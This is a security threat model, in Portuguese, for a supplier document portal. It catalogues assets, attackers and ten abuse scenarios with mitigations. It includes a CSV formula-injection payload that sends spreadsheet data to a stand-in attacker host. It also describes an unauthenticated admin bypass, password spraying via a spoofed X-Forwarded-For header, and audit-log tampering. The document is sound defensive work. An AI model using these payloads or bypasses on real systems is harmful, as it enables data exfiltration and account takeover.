# 22 — Modelo de ameaças

## Ativos

| Ativo | Por que importa | Onde vive |
|---|---|---|
| Documentos de fornecedores | contratos, NDAs, dossiês regulatórios, certificados | storage + `DocumentVersion` |
| Isolamento entre fornecedores | fornecedores são **concorrentes entre si** | `src/server/authz/scopes.ts` |
| Avaliação interna da Vionex | notas de etapa, motivo de bloqueio | `ProjectStage.notes`, `Project.blockerNote` |
| Credenciais | `passwordHash`, `AUTH_SECRET` | `User`, ambiente |
| Trilha de auditoria | prova de quem fez o quê | `AuditLog` |
| Dados pessoais | contatos, IPs, e-mails | `User`, `Supplier`, `LoginAttempt` |

## Atores

| Ator | Capacidade inicial |
|---|---|
| **Anônimo na internet** | alcança `/login`, `/api/health`, **e `/demo/enter`** |
| **Fornecedor legítimo** | sessão válida escopada ao próprio `supplierId` |
| **Fornecedor concorrente** | o mesmo — e interesse direto no dado alheio |
| **Usuário interno (VIEWER)** | leitura de tudo da organização, inclusive `INTERNAL_ONLY` |
| **Conta de fornecedor comprometida** | upload de arquivo + mensagens para a Vionex |
| **Admin comprometido** | tudo |
| **Insider Vionex** | conforme o papel; sem revisão de auditoria |

## Superfícies

`/login` · `/demo/enter` · `/api/files/[versionId]` · `/api/reports/[report]` ·
`/api/search` · `/api/health` · 12 server actions · upload de arquivo ·
rotas parametrizadas com identificador.

## Cenários de abuso

### T-01 · Anônimo vira administrador · **CRITICAL** · **funciona hoje**

`GET /demo/enter?as=admin` → sessão de ADMIN. Sem senha, sem throttle, sem
auditoria. Caminhos alternativos igualmente abertos: `/login` com `vionex123`, ou
JWT forjado com a chave publicada.

**Mitigação:** SEC-001, SEC-002, SEC-003 (Fase A).

### T-02 · Fornecedor A lê dados do Fornecedor B · **não funciona**

Testado por leitura contra as 8 funções de escopo, as 7 guardas e todas as rotas
parametrizadas. Todo caminho termina em 404. As guardas compõem o escopo **dentro**
da consulta, então um id fora do escopo é indistinguível de inexistente.

**Ressalva:** T-01 torna isto irrelevante — basta entrar como o outro fornecedor.

### T-03 · Fornecedor lê a avaliação interna da Vionex sobre si · **HIGH** · **funciona hoje**

`getProjectWorkspace` devolve as linhas completas de `ProjectStage` e
`Milestone`, e o projeto inteiro, para a página do portal. `ProjectStage.notes`
está no payload RSC e é legível no DevTools **mesmo sem a interface renderizar**.

Cenário realista: *"fornecedor não responde há três semanas, avaliar
substituição"* ou *"margem abaixo do praticado com o Fornecedor B"*.

**Mitigação:** TEN-002 (Fase D).

### T-04 · Fornecedor executa código na máquina de um funcionário Vionex · **HIGH**

Dois caminhos:

**(a) Injeção de fórmula em CSV.** O fornecedor nomeia um documento
`=HYPERLINK("http://attacker/"&A1,"Abrir")`. Um funcionário exporta o relatório
regulatório e abre no Excel. `toCsv` não neutraliza `=`, `+`, `-`, `@`.

**(b) Documento com macro.** `validateUpload` confia no MIME declarado pelo
cliente e não há antivírus. Um `.docx` malicioso passa e é baixado por quem
precisa revisá-lo — que é a função do produto.

**Mitigação:** SEC-004, SEC-006 (Fase G).

### T-05 · Password spraying · **HIGH**

Uma senha comum contra todos os e-mails conhecidos. O limite por e-mail
(8/10min) não impede — cada conta recebe uma tentativa. O limite por IP
(20/10min) seria a defesa, mas `clientIp()` lê `X-Forwarded-For` do cliente sem
cadeia de proxy confiável: basta variar o cabeçalho.

Sem MFA, sem alerta de login suspeito.

**Mitigação:** SEC-005, SEC-007 (Fase C).

### T-06 · Token roubado permanece válido por 30 dias · **HIGH**

Sem `tokenVersion`, trocar a senha **não** invalida sessões. O único desligamento
é `status != ACTIVE`, que desativa a conta inteira — resposta grosseira para um
vazamento de token, e que exige perceber o vazamento.

Sem visibilidade de sessões ou dispositivos ativos.

**Mitigação:** SEC-007 (Fase C).

### T-07 · Insider apaga o próprio rastro · **MEDIUM**

`AuditLog` não tem proteção no banco: sem trigger, sem `REVOKE`, sem role
restrita. A aplicação conecta como dona do schema. Um `DELETE` direto apaga.
`onDelete: Cascade` em `organizationId` apaga a trilha inteira junto com a
organização. E `recordAudit` já perde entradas em silêncio.

**Mitigação:** OPS-002, DB-002 (Fases E e J).

### T-08 · Perda de dados por variável em branco · **CRITICAL**

Alguém apaga `DATABASE_URL` no painel. `blankToUndefined` trata `""` como
ausente, `shouldUseEmbeddedDatabase` retorna `true`, a aplicação **sobe** sobre
um banco em memória com dados fictícios, e `/api/health` responde **200 ok**.

Escritas subsequentes se perdem no reciclo. Ninguém é notificado.

**Mitigação:** DB-007 (Fase A).

### T-09 · Enumeração e reconhecimento · **MEDIUM**

`/api/health` é público e, nos `warnings`, informa a um anônimo que as sessões
são assinadas com a chave publicada. `/demo` lista nome e papel de 8 usuários
reais.

A enumeração pelo formulário de login **está mitigada** pelo `DUMMY_HASH` de
custo igual.

**Mitigação:** SEC-009 (Fase G).

### T-10 · Exaustão de recursos · **MEDIUM**

`/api/files/[versionId]` carrega o arquivo inteiro em memória (até 25 MB) e não
tem rate limit. Um laço de downloads autenticados leva a função ao limite de
memória e gera custo. `/api/search` dispara 4 sequential scans por consulta, sem
limite.

**Mitigação:** SEC-010, STO-002 (Fases G e H).

## Superfícies que **não** são ameaça

Registrado porque é um resultado real da auditoria:

- **Nenhuma integração externa.** Sem webhooks, sem cron, sem e-mail, sem
  analytics, sem CDN. A única chamada do navegador é `/api/search`, mesma origem.
- **Nenhuma injeção de SQL.** As únicas construções raw são um tagged template
  sem interpolação e um `$executeRawUnsafe` com string literal estática, guardado
  por ambiente.
- **XSS armazenado fechado.** SVG e HTML fora da allowlist de MIME, mais
  `X-Content-Type-Options: nosniff` na rota de download.
- **Clickjacking fechado.** `frame-ancestors 'none'` + `X-Frame-Options: DENY`.
- **Path traversal fechado.** `resolveKey` em `src/lib/storage/local.ts`.
- **Open redirect fechado.** `safeDestination` em `/demo/enter`.
